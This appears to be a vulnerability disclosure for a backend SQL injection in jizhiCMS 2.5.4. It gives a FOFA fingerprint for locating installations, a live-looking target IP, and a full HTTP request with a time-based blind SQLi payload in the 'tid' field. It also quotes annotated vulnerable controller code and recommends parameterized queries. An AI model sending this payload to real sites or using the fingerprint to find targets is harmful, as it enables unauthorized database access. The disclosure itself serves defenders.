# jizhicms-sql01
The jizhicms version 2.5.4 contains a backend SQL injection vulnerability.
Jizhicms-sql
The jizhicms version 2.5.4 contains a backend SQL injection vulnerability. There is a backend SQL injection vulnerability in jizhiCMS version 2.5.4. Fingerprint fofa:icon_hash="1657387632" SQL injection Vulnerability The vulnerable file is located at: http://154.217.245.237:1234/index.php/admins/Comment/addcomment.html This is where the backend SQL injection vulnerability exists in jizhiCMS version 2.5.4. Vulnerability Poc(Proof of Concept):
POST /index.php/admins/Comment/addcomment.htm HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
ccept: / X-Requested-With: XMLHttpRequest 
Referer: http://154.217.245.237:1234/index.php/admins/Comment/addcomment.htm
Cookie: PHPSESSID=umgc0aguscmvgmjv96mvjmpd81 Accept-Encoding: gzip, deflate Origin: http://154.217.245.237:1234 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0 Content-Length: 47

go=1&userid=1&tid=0' OR (SELECT 6192 FROM (SELECT(SLEEP(5)))EDtk) AND 'KAVJ'='KAVJ&aid=1&zid=1&pid=1&body=<p>1</p >&reply=&ismsg=0&likes=0&isread=0&isshow=1&addtime=2025-05-08 00:34:14

Vulnerability Type: Backend SQL Injection 
Affected File/Function:  jizhicms-2.5.4/app/admin/c/CommentController.php，

Component: jizhiCMS 2.5.4
Attack Vector: Authenticated POST request
Vulnerable Code: function commentlist(){
    
// [Injection Point 1] - The 'tid' parameter is not filtered, potentially leading to SQL injection
// Attackers can pass values like "1 OR 1=1" to tamper with SQL logic
    $this->tid=  $this->frparam('tid');
    
 // [Injection Point 2] - The 'aid' parameter is not validated, posing an injection risk
    $this->aid = $this->frparam('aid');
    
// [Injection Point 3] - Improper handling of the 'isshow' parameter
// Although value checks are performed later, strict type conversion is not enforced, allowing attackers to pass "1' OR '1'='1".
    $this->isshow = $this->frparam('isshow');
    
// [Injection Point 4] - The 'userid' parameter is not filtered
    $this->userid = $this->frparam('userid');
    
// [Injection Point 5] - The filtering mechanism for the 'body' parameter is unclear
// The meaning of the second parameter "1" is unknown, which may result in insufficient filtering.
    $this->body = $this->frparam('body',1);

    
    if($this->frparam('ajax')){
        
        $page = new Page('Comment');
        $sql = '1=1';
        
        // [注入点6] - isshow参数直接拼接到SQL中
        // 若传入非预期值（如"1 OR 1=1"），会导致条件恒真
        if($this->isshow==1){
            $sql .= ' and isshow=1 ';
        }else if($this->isshow==2){
            $sql .= ' and isshow=0 ';
        }else if($this->isshow==3){
            $sql .= ' and isshow=2 ';
        }
        
// [Injection Point 6] - The 'isshow' parameter is directly concatenated into the SQL query
// If an unexpected value (e.g., "1 OR 1=1") is provided, it will cause the condition to always evaluate to true.
        if($this->admin['classcontrol']==1 && $this->admin['isadmin']!=1 && $this->molds['iscontrol']!=0 && $this->molds['isclasstype']==1){
            $a1 = explode(',',$this->tids);
            $a2 = array_filter($a1);
            $tids = implode(',',$a2);
            $sql.=' and tid in('.$tids.') '; // Directly concatenates user input 'tids' without sanitization
        }
 Description: The application builds a dynamic SQL query using a variable $this->tids, which is concatenated directly into the SQL string without any sanitization or parameterization. If an attacker is able to control or manipulate the value of $this->tids, they could inject arbitrary SQL code into the query
Impact: Unauthorized SQL execution Information disclosure Potential remote code execution (if combined with other vulnerabilities) Database integrity compromise 
Recommendation: Sanitize and strictly cast input values to expected types (e.g., use (int)$this->frparam('isshow')) Replace raw SQL concatenation with prepared statements (parameterized queries)
![image](https://github.com/user-attachments/assets/83413b62-8d0c-4413-b5cb-033f587af5d2)
![image](https://github.com/user-attachments/assets/f7ded6d0-31ba-4e11-8bae-e5790cdce4c1)

